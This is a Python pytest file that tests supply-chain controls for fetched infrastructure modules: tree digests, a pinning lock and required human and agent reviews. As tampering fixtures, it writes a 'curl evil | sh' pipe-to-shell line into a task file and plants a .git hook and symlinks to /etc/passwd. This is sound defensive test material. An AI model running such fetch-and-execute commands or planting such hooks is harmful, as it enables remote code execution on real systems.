# SPDX-License-Identifier: Apache-2.0
"""The supply chain of fetched modules (ADR-0027 follow-up 5): the tree digest, the lock and the
reviews keyed by it, so an unpinned, changed or unreviewed module is not loadable."""

from __future__ import annotations

import copy
import os
import sys
from pathlib import Path

import pytest
import yaml

from homelabnext import reviews as rv
from homelabnext.modules import supply as su

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT / "tools") not in sys.path:
    sys.path.insert(0, str(ROOT / "tools"))
import schema_check as sc

POLICY = rv.load_policy(ROOT / "examples/review-policy.yml")
SCHEMA = sc.load_instance(ROOT / "schemas/platform/module_lock.schema.json")
REGISTRY = sc.build_registry(ROOT)
GIT = {
    "kind": "git",
    "url": "https://git.example.invalid/modules/tool",
    "commit": "0123456789abcdef0123456789abcdef01234567",
}
ARCHIVE = {"kind": "archive", "url": "https://git.example.invalid/tool.tar.gz", "sha256": "ab" * 32}


def module(tmp_path, files=None, mid="example-tool", kind="feature", origin=None, where="fetched"):
    d = tmp_path / where / mid
    for rel, body in (
        files or {"module.yml": b"id: x\n", "roles/r/tasks/main.yml": b"- x\n"}
    ).items():
        (d / rel).parent.mkdir(parents=True, exist_ok=True)
        (d / rel).write_bytes(body)
    return {"id": mid, "kind": kind, "author": "agent:example-builder", "origin": origin or GIT}, d


def review(tree, by, kind, role, verdict="pass"):
    return {
        "by": by,
        "kind": kind,
        "role": role,
        "date": "2026-10-20",
        "verdict": verdict,
        "digest": tree,
    }


def reviewed(tree: str, *, approve=True) -> list[dict]:
    out = [
        review(tree, "agent:example-checker", "agent", "check"),
        review(tree, "agent:example-auditor", "agent", "audit"),
    ]
    if approve:
        out.append(review(tree, "human:example-operator", "human", "approve"))
    return out


def lock_of(m, d, reviews=None) -> dict:
    e = su.lock_entry(d, m)
    e["reviews"] = reviewed(e["tree"]) if reviews is None else reviews
    return {"schema_version": "1.0", "modules": {m["id"]: e}}


def problems(m, d, lock, policy=POLICY):
    return su.lock_problems(
        {m["id"]: m}, {m["id"]: d}, lock, policy, (d.parent.parent / "modules",)
    )


# ------------------------------------------------------------------- the tree digest


def test_the_digest_covers_path_content_and_the_executable_bit(tmp_path):
    _m, d = module(tmp_path)
    first = su.tree_digest(d)
    assert first.startswith("sha256:") and len(first) == 71
    assert su.tree_digest(d) == first
    (d / "roles/r/tasks/main.yml").write_bytes(b"- y\n")
    second = su.tree_digest(d)
    assert second != first
    (d / "roles/r/tasks/main.yml").chmod(0o755)
    assert su.tree_digest(d) != second
    (d / "roles/r/tasks/main.yml").rename(d / "roles/r/tasks/other.yml")
    assert su.tree_digest(d) not in (first, second)


def test_empty_directories_are_documented_as_not_covered(tmp_path):
    _m, d = module(tmp_path)
    before = su.tree_digest(d)
    (d / "empty").mkdir()
    assert su.tree_digest(d) == before


@pytest.mark.parametrize("where", ["root-dir", "root-file", "nested-dir", "root-link"])
def test_version_control_metadata_is_refused_everywhere(tmp_path, where):
    _m, d = module(tmp_path)
    if where == "root-dir":
        (d / ".git" / "hooks").mkdir(parents=True)
        (d / ".git" / "hooks" / "post-checkout").write_text("evil")
    elif where == "root-file":
        (d / ".git").write_text("gitdir: elsewhere")
    elif where == "nested-dir":
        (d / "roles" / ".git").mkdir()
    else:
        os.symlink("/etc", d / ".git")
    with pytest.raises(su.SupplyError, match="version-control"):
        su.tree_digest(d)


@pytest.mark.parametrize("where", ["file", "dir", "root"])
def test_a_link_anywhere_refuses_the_digest(tmp_path, where):
    _m, d = module(tmp_path)
    (tmp_path / "outside").mkdir()
    (tmp_path / "outside" / "secret").write_text("s")
    if where == "file":
        os.symlink(tmp_path / "outside" / "secret", d / "roles" / "link")
        target = d
    elif where == "dir":
        os.symlink(tmp_path / "outside", d / "roles" / "linkdir", target_is_directory=True)
        target = d
    else:
        os.symlink(d, tmp_path / "rootlink", target_is_directory=True)
        target = tmp_path / "rootlink"
    with pytest.raises(su.SupplyError):
        su.tree_digest(target)


def test_special_and_hard_linked_files_refuse_the_digest(tmp_path):
    _m, d = module(tmp_path)
    os.link(d / "module.yml", tmp_path / "outside-link")
    with pytest.raises(su.SupplyError, match="hard links"):
        su.tree_digest(d)
    os.unlink(tmp_path / "outside-link")
    os.mkfifo(d / "fifo")
    with pytest.raises(su.SupplyError, match="special file"):
        su.tree_digest(d)


def test_a_tree_over_its_limits_is_refused(tmp_path):
    _m, d = module(tmp_path)
    with pytest.raises(su.SupplyError, match="files"):
        su.tree_digest(d, su.TreeLimits(max_files=1))
    with pytest.raises(su.SupplyError, match="bytes"):
        su.tree_digest(d, su.TreeLimits(max_bytes=5))


def test_hnx_reviews_digest_gives_a_module_directory_its_tree_digest(tmp_path, capsys):
    _m, d = module(tmp_path)
    assert rv.file_digest(d) == su.tree_digest(d)
    assert rv.main(["digest", str(d)]) == 0
    assert capsys.readouterr().out.startswith(su.tree_digest(d))
    with pytest.raises(rv.ReviewError, match=r"no module\.yml"):
        rv.file_digest(tmp_path)
    (d / ".git").mkdir()
    with pytest.raises(rv.ReviewError, match="version-control"):
        rv.file_digest(d)


# ------------------------------------------------------------------- the lock


@pytest.mark.parametrize("origin", [GIT, ARCHIVE])
def test_a_pinned_and_reviewed_fetched_module_is_loadable(tmp_path, origin):
    m, d = module(tmp_path, origin=origin)
    lock = lock_of(m, d)
    assert problems(m, d, lock) == []
    assert sc.errors_for(SCHEMA, lock, REGISTRY) == []


def test_an_unpinned_fetched_module_is_not_loadable(tmp_path):
    m, d = module(tmp_path)
    got = problems(m, d, {"schema_version": "1.0", "modules": {}})
    assert got == ["example-tool: fetched (git) but not pinned in the lock: not loadable"]


def test_a_changed_module_is_not_loadable_and_its_reviews_do_not_follow(tmp_path):
    m, d = module(tmp_path)
    lock = lock_of(m, d)
    (d / "roles/r/tasks/main.yml").write_bytes(b"- curl evil | sh\n")
    assert any("changed since it was pinned" in p for p in problems(m, d, lock))
    lock["modules"][m["id"]]["tree"] = su.tree_digest(d)  # re-pinned: the reviews name the old tree
    got = problems(m, d, lock)
    assert any("needs" in p and "not loadable" in p for p in got), got


@pytest.mark.parametrize("kind", [None, "bogus", ["provider"], "Provider"])
def test_a_module_of_no_known_kind_is_never_loadable(tmp_path, kind):
    m, d = module(tmp_path)
    lock = lock_of(m, d, reviews=[])
    m["kind"] = kind
    assert any("is not one of" in p for p in problems(m, d, lock))


def test_a_kind_the_policy_leaves_out_fails_closed_and_the_policy_still_loads(tmp_path):
    m, d = module(tmp_path)
    data = yaml.safe_load((ROOT / "examples/review-policy.yml").read_text())
    del data["requirements"]["module-feature"]
    policy = rv.policy_from(data)
    got = problems(m, d, lock_of(m, d), policy=policy)
    assert any("asks nothing of module-feature" in p for p in got), got


def test_a_self_declared_in_tree_module_outside_the_public_tree_is_refused(tmp_path):
    m, d = module(tmp_path, origin={"kind": "in-tree"})
    got = problems(m, d, {"schema_version": "1.0", "modules": {}})
    assert got == [
        "example-tool: in-tree means shipped under the public modules/ tree, and only that"
    ]


def test_a_module_under_the_public_tree_is_in_tree_and_never_locked(tmp_path):
    m, d = module(tmp_path, origin={"kind": "in-tree"}, where="modules")
    roots = (tmp_path / "modules",)
    empty = {"schema_version": "1.0", "modules": {}}
    assert su.lock_problems({m["id"]: m}, {m["id"]: d}, empty, POLICY, roots) == []
    lock = {
        "schema_version": "1.0",
        "modules": {m["id"]: {"origin": GIT, "tree": "x", "reviews": []}},
    }
    assert any(
        "never locked" in p
        for p in su.lock_problems({m["id"]: m}, {m["id"]: d}, lock, POLICY, roots)
    )
    fetched, d2 = module(tmp_path, mid="other", where="modules")
    got = su.lock_problems({"other": fetched}, {"other": d2}, lock_of(fetched, d2), POLICY, roots)
    assert any("only that" in p for p in got), got
    with pytest.raises(su.SupplyError, match="fetched"):
        su.lock_entry(d, m)


def test_a_module_without_its_approve_review_is_not_loadable(tmp_path):
    m, d = module(tmp_path)
    got = problems(m, d, lock_of(m, d, reviewed(su.tree_digest(d), approve=False)))
    assert len(got) == 1 and "approve" in got[0] and "not loadable" in got[0], got


@pytest.mark.parametrize("verdict", ["changes", "reject"])
def test_a_non_pass_verdict_on_the_tree_vetoes_it(tmp_path, verdict):
    m, d = module(tmp_path)
    tree = su.tree_digest(d)
    revs = [*reviewed(tree), review(tree, "agent:example-other", "agent", "audit", verdict)]
    assert any(f"says {verdict}" in p for p in problems(m, d, lock_of(m, d, revs)))


def test_a_review_of_a_digest_prefix_does_not_count(tmp_path):
    m, d = module(tmp_path)
    tree = su.tree_digest(d)
    revs = reviewed(tree)
    revs[2]["digest"] = tree[:23]
    got = problems(m, d, lock_of(m, d, revs))
    assert any("prefix of the tree" in p for p in got) and any("approve" in p for p in got), got


def test_the_author_never_reviews_their_own_module_and_is_never_unknown(tmp_path):
    m, d = module(tmp_path)
    revs = reviewed(su.tree_digest(d))
    revs[0]["by"] = m["author"]
    assert any("is the author" in p for p in problems(m, d, lock_of(m, d, revs)))
    for author in ("unknown", None, "no-colon"):
        assert any(
            "names its author" in p for p in problems({**m, "author": author}, d, lock_of(m, d))
        )


def test_the_origin_must_be_the_lock_s(tmp_path):
    m, d = module(tmp_path)
    lock = lock_of(m, d)
    m2 = copy.deepcopy(m)
    m2["origin"]["commit"] = "f" * 40
    assert any("not the one the lock pins" in p for p in problems(m2, d, lock))


def test_a_stale_entry_and_a_malformed_lock_are_reported_never_raised(tmp_path):
    m, d = module(tmp_path)
    lock = lock_of(m, d)
    lock["modules"]["gone"] = copy.deepcopy(lock["modules"][m["id"]])
    lock["modules"][1] = {}
    got = problems(m, d, lock)
    assert any("gone is locked but not selected" in p for p in got)
    assert any("1 is locked but not selected" in p for p in got)
    assert problems(m, d, []) == ["the lock is not a mapping"]
    assert problems(m, d, {"schema_version": "2.0", "modules": {}})[0].startswith(
        "the lock's schema_version"
    )
    bad = lock_of(m, d)
    bad["modules"][m["id"]]["tree"] = "sha256:abc"
    assert any("not sha256:<64 hex>" in p for p in problems(m, d, bad))
    empty = {"schema_version": "1.0", "modules": {}}
    assert su.lock_problems({"x": "not a mapping"}, {}, empty, POLICY, ()) == [
        "x: the manifest is not a mapping"
    ]


def test_without_a_policy_no_fetched_module_loads(tmp_path):
    m, d = module(tmp_path)
    assert any("no review policy" in p for p in problems(m, d, lock_of(m, d), policy=None))


@pytest.mark.parametrize("kind", su.KINDS)
def test_every_module_kind_needs_a_human_approve(kind):
    reqs = {(q.role, q.kind) for q in POLICY.required(f"module-{kind}", "locked")}
    assert (
        ("approve", "human") in reqs and ("check", "agent") in reqs and ("audit", "agent") in reqs
    )


def test_a_link_in_a_pinned_module_is_reported_not_raised(tmp_path):
    m, d = module(tmp_path)
    lock = lock_of(m, d)
    os.symlink("/etc/passwd", d / "roles" / "pw")
    assert any("cannot be digested" in p for p in problems(m, d, lock))


NEGATIVES = sorted(p.name for p in (ROOT / "schemas/platform/negative").glob("module_lock.*"))


@pytest.mark.parametrize("negative", NEGATIVES)
def test_each_lock_negative_is_refused_by_the_schema(negative):
    doc = sc.load_instance(ROOT / "schemas/platform/negative" / negative)
    assert sc.errors_for(SCHEMA, doc, REGISTRY), negative
